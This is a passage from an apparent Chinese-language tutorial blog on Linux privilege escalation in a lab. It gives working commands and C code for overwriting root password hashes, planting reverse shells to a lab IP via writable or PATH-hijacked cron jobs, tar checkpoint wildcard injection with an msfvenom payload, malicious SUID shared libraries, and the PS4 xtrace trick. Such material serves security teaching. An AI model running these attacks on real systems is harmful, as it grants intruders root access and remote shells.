alt=\"image-20240221220330572\"></p>\n<h3 id=\"可写shadow文件利用\"><a class=\"markdownIt-Anchor\" href=\"#可写shadow文件利用\">#</a> 可写 shadow 文件利用</h3>\n<p>利用原理：把 shadow 文件里 root 用户 hash 值替换为自己生成的就可以 hash 再用生成用到的明文进行登录 root</p>\n<p>前提要有 shadow 可写权限</p>\n<p>通过 mkpasswd 生成哈希</p>\n<p><code>mkpasswd -m sha-512 1234567</code></p>\n<p><code>$6$hpRA5YNV9lAANtsF$JwX/K8VfxhxpTm5U2oTEgFw.YiYVCmfzZ0i6SqUDkpJRamWVmQ0LgflQUlhjVHkAS5N8MwFFR12mHBg6qFhwC/</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221221309745.png\" alt=\"image-20240221221309745\"></p>\n<p>用 sha-512 是因为</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$6</span>$开头的，表明是用SHA-512加密的，密文长度86</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token variable\">$1</span>$ 表明是用MD5加密的，密文长度22个字符</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token variable\">$2</span>$ 是用Blowfish加密的，</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token variable\">$5</span>$ 是用 SHA-256加密的，密文长度43</pre></td></tr></table></figure><p>接着把生成的 hash 替换原本的就可以用 1234567 登陆了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221221617115.png\" alt=\"image-20240221221617115\"></p>\n<h3 id=\"可写passwd文件利用\"><a class=\"markdownIt-Anchor\" href=\"#可写passwd文件利用\">#</a> 可写 passwd 文件利用</h3>\n<p>虽然 passwd 文件里 hash 被 X 替代了无法查看但是把 X 替换为我们生成的 hash 还是可以登陆的</p>\n<p>利用 openssl 生成</p>\n<p><code>openssl passwd 987654321</code></p>\n<p><code>$1$uOZ/Tr4f$EqDyR9WU8wJNeB3tEY09f.</code></p>\n<p>把 passwd 里 root 的 X 替换</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221222616639.png\" alt=\"image-20240221222616639\"></p>\n<p>即可用 987654321 切换 root</p>\n<h3 id=\"计划任务提权\"><a class=\"markdownIt-Anchor\" href=\"#计划任务提权\">#</a> 计划任务提权</h3>\n<p>查看计划任务</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240222000243892.png\" alt=\"image-20240222000243892\"></p>\n<p><code>* * * * * root    /home/crontab.sh</code></p>\n<p>这条计划任务的意思是每 1 分钟执行一次 crontab.sh 脚本，并且是以 root 用户的权限来执行。</p>\n<p>而这个文件我们是有权更改的那么就可以写入反弹 shell 命令</p>\n<p><code>echo 'bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.139/4444 0&gt;&amp;1&quot;' &gt; crontab.sh</code></p>\n<p>nc 进行监听等一分钟拿 shell</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240222003928818.png\" alt=\"image-20240222003928818\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240222005508201.png\" alt=\"image-20240222005508201\"></p>\n<h3 id=\"计划任务环境变量提权\"><a class=\"markdownIt-Anchor\" href=\"#计划任务环境变量提权\">#</a> 计划任务环境变量提权</h3>\n<p>如果你在计划任务中没有指定程序的绝对路径，系统会在 crontab 文件中的 <code>PATH</code>  环境变量所列出的目录中查找该程序。这些目录会按照在 <code>PATH</code>  变量中的顺序被检查。如果在某个目录中找到了该程序，系统就会停止搜索并执行该程序。</p>\n<p>图中每分钟执行一次 <code>shell.sh</code>  脚本但是没有指定绝对路径， <code>PATH</code>  中默认优先查找 /home/yunyi 路径下有没有 shell.sh 有的话</p>\n<p>就每分钟执行，利用这个特性就可以在 <code>yunyi</code>  目录中创建一个 <code>shell.sh</code>  并写上反弹 shell 进行提权</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223220655325.png\" alt=\"image-20240223220655325\"></p>\n<p><code>#!/bin/bash</code></p>\n<p><code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.142/7676 0&gt;&amp;1&quot;</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223220835815.png\" alt=\"image-20240223220835815\"></p>\n<p>别忘了给执行权限 <code>chmod +x shell.sh</code></p>\n<p><code>kali：nc -vlnp 7676</code></p>\n<p>获取 shell</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223221033086.png\" alt=\"image-20240223221033086\"></p>\n<h3 id=\"计划任务通配符提权\"><a class=\"markdownIt-Anchor\" href=\"#计划任务通配符提权\">#</a> 计划任务通配符提权</h3>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223220655325.png\" alt=\"image-20240223220655325\"></p>\n<p>这里还有一个 zip.sh 看一下内容是</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223221316077.png\" alt=\"image-20240223221316077\"></p>\n<p>到 home/yunyi/user 目录下打包所有文件夹文件到 /tmp 目录下名为 yunyi.tar.gz</p>\n<p>利用 tar <code>命令的</code> –checkpoint <code>和</code> –checkpoint-action</p>\n<p>tar <code>命令的</code> –checkpoint <code>和</code> –checkpoint-action <code>参数可以被用来执行提权操作这是因为</code>  tar` 命令在处理文件时，可以在每个检查点 checkpoint 执行一个特定的动作 action</p>\n<p>如果管理员给予了某个普通用户 <code>tar</code>  命令的超级管理员操作权限，那么我们可以使用 <code>tar</code>  命令进行提权例如，以下命令可以创建一个新的归档文件，并在每个检查点执行 <code>/bin/bash</code>  命令</p>\n<p><code>sudo -u root tar cf /dev/null exploit --checkpoint=1 --checkpoint-action=exec=&quot;/bin/bash&quot;</code></p>\n<p>在这个命令中， <code>--checkpoint=1</code>  表示每处理一个文件就设置一个检查点， <code>--checkpoint-action=exec=&quot;/bin/bash&quot;</code>  表示在每个检查点执行 <code>/bin/bash</code>  命令因为 <code>tar</code>  命令是以 <code>root</code>  用户的身份运行的，所以 <code>/bin/bash</code>  命令也会以 <code>root</code>  用户的身份运行，从而获得 <code>root</code>  权限</p>\n<p>kali 生成反弹 shell 文件</p>\n<p><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.142 LPORT=8989 -f elf -o shell.elf</code></p>\n<p>启动一个 http 服务受害机下载 shell 文件并给予权限</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224132512587.png\" alt=\"image-20240224132512587\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224132558854.png\" alt=\"image-20240224132558854\"></p>\n<p>在 user 目录创建这两个文件</p>\n<p><code>touch /home/yunyi/user/--checkpoint-action=exec=shell.elf</code></p>\n<p><code>touch /home/yunyi/user/--checkpoint=1</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224133036613.png\" alt=\"image-20240224133036613\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224140015673.png\" alt=\"image-20240224140015673\"></p>\n<p><code>nc -lvnp 8989</code>  拿到权限</p>\n<p>也可以创建一个 sh 脚本反弹 shell</p>\n<p><code>touch /home/yunyi/user/--checkpoint-action=exec=sh shell.sh</code></p>\n<h3 id=\"suid原理详解\"><a class=\"markdownIt-Anchor\" href=\"#suid原理详解\">#</a> SUID 原理详解</h3>\n<h4 id=\"suid共享库提权\"><a class=\"markdownIt-Anchor\" href=\"#suid共享库提权\">#</a> SUID 共享库提权</h4>\n<p>其实 suid 提权原理就是利用有 s 位的程序去执行我们的恶意文件恶意命令</p>\n<p>编写一个有漏洞的程序</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;dlfcn.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// 检查是否提供了正确数量的参数</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>argc <span class=\"token operator\">!=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Usage: %s &lt;path to .so file>\\n\"</span><span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// 使用 dlopen 函数加载共享库</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">// RTLD_LAZY 表示在 dlopen 返回前，解析器不会解析库中的任何符号</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\">// 符号解析将推迟到第一次调用 dlsym 或者第一次访问这些符号时进行</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>handle <span class=\"token operator\">=</span> <span class=\"token function\">dlopen</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> RTLD_LAZY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>handle<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token comment\">// 如果 dlopen 返回 NULL，表示加载共享库失败</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token comment\">// 此时可以使用 dlerror 函数获取错误信息</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Error: %s\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">dlerror</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\">// 使用 dlclose 函数卸载共享库</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token comment\">// 如果共享库不再需要，应该尽快卸载，以节省内存资源</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token function\">dlclose</span><span class=\"token punctuation\">(</span>handle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>编译好给 s 权限</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc <span class=\"token parameter variable\">-o</span> loader loader.c <span class=\"token parameter variable\">-ldl</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">chown</span> root:root loader</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">chmod</span> u+s loader</pre></td></tr></table></figure><p>这段程序会接受我们传入的参数这个参数就是一个共享库 so 文件，因为这个文件是有 s 位权限的我们就可以写一个提权的 so 文件执行以后就会获取 root 权限的 shell</p>\n<p>编写一个共享库文件里面是提权代码</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 使用 attribute ((constructor)) 标记，使得这个函数在 main 函数执行前被调用</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">__attribute__</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>constructor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">// 将当前进程的用户 ID 和组 ID 设置为 0（对应 root 用户）</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">setgid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">setuid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">// 启动一个新的 bash shell</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\">//-p 选项会让 bash 保留特权，这意味着新启动的 shell 会以 root 权限运行</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/bash -p\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#编译成 so</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>gcc <span class=\"token parameter variable\">-shared</span> <span class=\"token parameter variable\">-fPIC</span> <span class=\"token parameter variable\">-o</span> shell2.so shell2.c</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#生成一个名为 shell.so 的共享库文件。-shared 生成一个共享库，-fPIC 生成位置无关代码，</span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224223157195.png\" alt=\"image-20240224223157195\"></p>\n<p>执行 /usr/local/bin/loader <span class=\"exturl\" data-url=\"aHR0cDovL3NoZWxsLnNv\">shell.so</span></p>\n<p>当前权限</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224225741050.png\" alt=\"image-20240224225741050\"></p>\n<p>执行以后</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224225907104.png\" alt=\"image-20240224225907104\"></p>\n<p>原理：</p>\n<p>漏洞点在于程序允许任何用户加载并执行任意的共享库。如果一个恶意用户能够控制被加载的共享库，那么他们就可以执行任意代码，并且由于程序设置了  <code>SUID</code>  位，这段代码将以文件所有者（在我们的例子中是 root 用户）的权限来执行。</p>\n<p>例如，可以创建一个共享库，其中包含一个构造函数（在共享库被加载时自动执行的函数），这个构造函数执行一些恶意操作，如创建一个 root shell。然后可以通过程序来加载这个共享库。由于程序设置了  <code>SUID</code>  位，这个共享库将以 root 用户的权限来执行，因此就可以获得 root 权限。</p>\n<h4 id=\"suid环境变量劫持提权\"><a class=\"markdownIt-Anchor\" href=\"#suid环境变量劫持提权\">#</a> SUID 环境变量劫持提权</h4>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 尝试执行 shell 程序</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>      <span class=\"token function\">setuid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      <span class=\"token function\">setgid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"shell\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"错误：没有找到shell\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"shell程序已成功执行\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>因为它使用了 <code>system</code>  函数，而 <code>system</code>  函数会在用户的环境变量 <code>PATH</code>  中查找命令。因此，如果用户有权限修改自己的环境变量，就可以劫持 <code>shell</code>  文件写一个同名文件然后写入提权程序拿到 root</p>\n<p>在 /home/kali/hc 创建一个 shell 程序</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>       <span class=\"token function\">setgid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>       <span class=\"token function\">setuid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>       <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/bash -p\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>更改临时环境便变量让程序执行时首先查找 /home/kali/hc 目录下有没有 shell</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span>/home/kali/hc:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/kali/hc</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240225152031452.png\" alt=\"image-20240225152031452\"></p>\n<h4 id=\"suid-滥用shell功能提权\"><a class=\"markdownIt-Anchor\" href=\"#suid-滥用shell功能提权\">#</a> SUID - 滥用 shell 功能提权</h4>\n<p>查看 bash 版本在 bash 版本低于 4.4 的时候用</p>\n<p><code>env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)' /usr/local/bin/suid4</code>  进行提权</p>\n<p>原理为：</p>\n<p><code>env -i</code> ：这个命令用于运行一个程序，在一个新的、空的环境中。也就是说，它不会继承任何环境变量。</p>\n<p><code>SHELLOPTS=xtrace</code> ：这个环境变量设置 Bash shell 进入追踪模式（xtrace），在这种模式下，Bash 会打印出执行的每一条命令。</p>\n<p>然后用 PS4 配合 xtrace 提权 PS4 是一个环境变量这个环境变量设置了 Bash shell 在打印追踪信息时使用的提示符</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>默认<span class=\"token environment constant\">PS4</span><span class=\"token variable\"><span class=\"token variable\">`</span> 的值设置为 <span class=\"token variable\">`</span></span><span class=\"token string\">'+'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>也就是我们打开xtrace模式打印出来的命令前面的+号</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>例如：</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#!/bin/bash</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token assign-left variable\"><span class=\"token environment constant\">PS4</span></span><span class=\"token operator\">=</span><span class=\"token string\">'Line $&#123;LINENO&#125;: '</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin class-name\">set</span> <span class=\"token parameter variable\">-x</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"Hello, world!\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>运行这个脚本，你会看到：</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Line <span class=\"token number\">4</span>: <span class=\"token builtin class-name\">echo</span> Hello, world<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Hello, world<span class=\"token operator\">!</span></pre></td></tr></table></figure><p><code>PS4='$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)'</code> ：我们把他替换为了 <code>'$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)'</code>  这些命令复制  <code>/bin/bash</code>  到  <code>/tmp/rootbash</code> ，并给予新文件 SUID 权限。这意味着任何用户运行  <code>/tmp/rootbash</code>  时，都会以文件所有者（在这种情况下是 root）的权限来运行。</p>\n<p><code>/usr/local/bin/suid4</code> ：这是要以新环境运行的程序。一个有 s 位的程序，由于  <code>SHELLOPTS</code>  和  <code>PS4</code>  的设置，它会在运行时执行  <code>PS4</code>  中的命令也就是复制出一个具有 root 权限的 bash shell 到 /tmp</p>\n<p>然后我们运行 <code>rootbash -p</code>  即可获得 root 权限的 shell</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240225180540986.png\" alt=\"image-20240225180540986\"></p>\n<p>可看到运行后生成了 rootbash 获取了 root</p>\n<p>当然可以将  <code>PS4</code>  中的命令替换为任何有效的 Bash 命令。因为  <code>PS4</code>  变量的值会在每次打印追踪信息之前被执行。所以你可以在  <code>PS4</code>  中插入任何你想要在每次命令执行之前运行的代码。</p>\n<h3 id=\"nsf提权\"><a class=\"markdownIt-Anchor\" href=\"#nsf提权\">#</a> NSF 提权</h3>\n<p>nsf 是 Linux 系统中用于共享文件和目录的功能通过 NFS，用户和程序可以访问远程系统上的文件，就像访问本地文件一样</p>\n<p>nsf 的配置在 /etc/exports 文件中</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226133638600.png\" alt=\"image-20240226133638600\"></p>\n<p>这行表示共享  <code>/tmp</code>  目录，所有的网络主机都可以访问（由  <code>*</code>  表示），有读写权限（由  <code>rw</code>  表示），共享将立即写入磁盘就是立即生效（由  <code>sync</code>  表示），  <code>insecure</code>  允许非保留端口连接 ，禁止 root 权限映射（由  <code>no_root_squash</code>  表示），并且不检查子目录的权限（由  <code>no_subtree_check</code>  表示）。</p>\n<p>特别是有 no_root_squash 启用  <code>no_root_squash</code>  